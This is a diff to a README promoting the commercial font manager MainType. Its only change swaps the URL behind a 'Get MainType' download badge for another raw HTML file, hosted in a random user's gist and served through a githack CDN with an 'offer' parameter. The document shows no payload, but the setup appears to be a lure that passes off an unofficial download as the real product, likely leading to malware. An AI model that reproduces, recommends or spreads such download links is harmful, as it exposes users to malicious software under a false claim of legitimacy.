@@ -3,7 +3,7 @@
 **MainType** by High-Logic is a powerful **font manager for creative professionals**, offering complete control over large font collections with real-time preview, organization, and activation tools.  
 Perfect for designers, studios, and publishers. 🔠  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/🔷%20Get%20MainType-0077CC?style=for-the-badge&logo=windowsxp&logoColor=white&labelColor=0B0F19)](https://glcdn.githack.com/-/snippets/4893913/raw/main/getapp.html?offer=MainType2025)
+[![Get GitHub Instruction](https://img.shields.io/badge/🔷%20Get%20MainType-0077CC?style=for-the-badge&logo=windowsxp&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/bubarrandomguy736/505904067a97a914318f0a09db7c576b/raw/80010a6bd3d07c7e8190e4eff7d64e3b2813a702/app.html?offer=MainType2025)
 
 ---
 
